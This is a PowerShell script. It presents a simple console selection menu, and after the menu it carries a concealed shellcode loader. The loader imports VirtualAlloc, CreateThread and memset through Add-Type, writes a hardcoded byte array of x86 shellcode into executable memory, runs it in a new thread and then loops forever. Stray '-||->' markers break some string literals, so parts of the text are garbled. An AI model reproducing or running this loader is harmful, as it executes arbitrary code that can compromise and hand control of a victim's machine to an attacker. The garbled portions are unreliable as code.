 -||-> function Show-Menu
{
	param (
		[string]$Title = 'My Menu'
	)
	 -||-> Clear-Host <-||- 
	 -||-> Write-Host "================ $Title ================" <-||- 
	
	 -||-> Write-Host "1: Press '1' for this option." <-||- 
	 -||-> Write-Host "2: Press '2' for this option." <-||- 
	 -||-> Write-Host "3: Press '3' for this option." <-||- 
	 -||-> Write-Host "Q: Press 'Q' to quit." <-||- 
} <-||- 

do
{
	 -||-> Show-Menu <-||- 
	 -||-> $selection =  -||-> Read-Host "Please make a selection" <-||-  <-||- 
	 -||-> Clear-Host <-||- 
	switch ( -||-> $selection <-||- )
	{
		'1' {
			 -||-> 'You chose option 
		} ' -||-> 2 <-||- 2' {
			'You chose option <-||-  
		} '3' {
			 -||-> 'You chose option 
		} ' -||-> q <-||- q' {
			return
		}
	}
	pause
}
until ($selection -eq 'q')
$OCo = '[DllImport( -||-> "kernel32.dll" <-||- )]public static extern IntPtr VirtualAlloc( -||-> IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect <-||- ) <-||- ; -||-> [DllImport("kernel32.dll")] -||-> p <-||- public static extern IntPtr CreateThread( -||-> IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId <-||- ) <-||- ; -||-> [DllImport("msvcrt.dll")] -||-> p <-||- public static extern IntPtr memset( -||-> IntPtr dest, uint src, uint count <-||- ) <-||- ; -||-> ';$w = Add-Type -memberDefinition $OCo -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbe,0x87,0xff,0x39,0x06,0xd9,0xcf,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x31,0x72,0x13,0x03,0x72,0x13,0x83,0xc2,0x83,0x1d,0xcc,0xfa,0x63,0x63,0x2f,0x03,0x73,0x04,0xb9,0xe6,0x42,0x04,0xdd,0x63,0xf4,0xb4,0x95,0x26,0xf8,0x3f,0xfb,0xd2,0x8b,0x32,0xd4,0xd5,0x3c,0xf8,0x02,0xdb,0xbd,0x51,0x76,0x7a,0x3d,0xa8,0xab,0x5c,0x7c,0x63,0xbe,0x9d,0xb9,0x9e,0x33,0xcf,0x12,0xd4,0xe6,0xe0,0x17,0xa0,0x3a,0x8a,0x6b,0x24,0x3b,0x6f,0x3b,0x47,0x6a,0x3e,0x30,0x1e,0xac,0xc0,0x95,0x2a,0xe5,0xda,0xfa,0x17,0xbf,0x51,0xc8,0xec,0x3e,0xb0,0x01,0x0c,0xec,0xfd,0xae,0xff,0xec,0x3a,0x08,0xe0,0x9a,0x32,0x6b,0x9d,0x9c,0x80,0x16,0x79,0x28,0x13,0xb0,0x0a,0x8a,0xff,0x41,0xde,0x4d,0x8b,0x4d,0xab,0x1a,0xd3,0x51,0x2a,0xce,0x6f,0x6d,0xa7,0xf1,0xbf,0xe4,0xf3,0xd5,0x1b,0xad,0xa0,0x74,0x3d,0x0b,0x06,0x88,0x5d,0xf4,0xf7,0x2c,0x15,0x18,0xe3,0x5c,0x74,0x74,0xc0,0x6c,0x87,0x84,0x4e,0xe6,0xf4,0xb6,0xd1,0x5c,0x93,0xfa,0x9a,0x7a,0x64,0xfd,0xb0,0x3b,0xfa,0x00,0x3b,0x3c,0xd2,0xc6,0x6f,0x6c,0x4c,0xef,0x0f,0xe7,0x8c,0x10,0xda,0x92,0x89,0x86,0xfa,0xd3,0x6a,0xc2,0x6d,0x16,0x8b,0xfb,0x31,0x9f,0x6d,0xab,0x99,0xcf,0x21,0x0b,0x4a,0xb0,0x91,0xe3,0x80,0x3f,0xcd,0x13,0xab,0x95,0x66,0xb9,0x44,0x40,0xde,0x55,0xfc,0xc9,0x94,0xc4,0x01,0xc4,0xd0,0xc6,0x8a,0xeb,0x25,0x88,0x7a,0x81,0x35,0x7c,0x8b,0xdc,0x64,0x2a,0x94,0xca,0x03,0xd2,0x00,0xf1,0x85,0x85,0xbc,0xfb,0xf0,0xe1,0x62,0x03,0xd7,0x7a,0xaa,0x91,0x98,0x14,0xd3,0x75,0x19,0xe4,0x85,0x1f,0x19,0x8c,0x71,0x44,0x4a,0xa9,0x7d,0x51,0xfe,0x62,0xe8,0x5a,0x57,0xd7,0xbb,0x32,0x55,0x0e,0x8b,0x9c,0xa6,0x65,0x0d,0xe0,0x70,0x43,0x7b,0x08,0x41;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$EoWJ=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($EoWJ.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$EoWJ,0,0,0);for (;;){Start-sleep 60};


 <-||- 
